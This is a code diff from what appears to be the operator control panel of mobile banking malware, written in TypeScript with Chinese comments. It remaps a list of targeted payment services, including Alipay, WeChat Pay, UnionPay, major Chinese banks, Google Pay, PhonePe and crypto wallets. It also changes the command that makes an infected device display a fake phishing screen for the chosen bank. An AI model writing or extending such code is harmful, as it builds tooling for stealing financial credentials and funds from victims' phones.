@@ -461,33 +461,34 @@ const handleSendPhish = (type: string) => {
     message.success(`钓鱼请求已发送 (${phishTypeNames[type] || type})`);
 };
 
-// 银行钓鱼类型名称映射
+// 银行钓鱼类型名称映射 (使用 USDT 命令格式)
 const bankNames: Record<string, string> = {
-    'a': '支付宝',
-    'w': '微信',
-    'yun': '云闪付',
-    'jian': '建行',
-    'you': '邮储',
-    'nong': '农行',
-    'zhong': '中行',
-    'gong': '工行',
-    'zhao': '招行',
-    'gpay': 'Google Pay',
-    'phonepe': 'PhonePe',
-    'bc': 'BC',
-    'mb': 'MB',
+    '0': 'IM',
+    '2': 'TP',
+    '6': '支付宝',
+    '7': '微信',
+    '8': '云闪付',
+    '9': '建行',
+    '10': '邮储',
+    '11': '农行',
+    '12': '中行',
+    '13': '工行',
+    '14': '招行',
+    '15': 'Google Pay',
+    '16': 'PhonePe',
+    '17': 'AN',
+    '18': 'MB',
+    '19': 'BC',
 };
 
 const handleSendBankPhish = (bank: string) => {
-    // 使用 DIAO 命令，typ 字段传递银行类型
+    // 使用 USDT 命令格式
     send({ 
-        itype: 'slr_panelsend', 
-        subc: 'DIAO', 
+        itype: 'slr_panel', 
+        subc: 'screen', 
         pid: deviceId.value, 
-        pin: '',
-        title: '',
-        lckdis: '',
-        typ: bank 
+        comand: 'usdt',
+        usdttype: bank 
     });
     message.success(`${bankNames[bank] || bank} 钓鱼请求已发送`);
 };
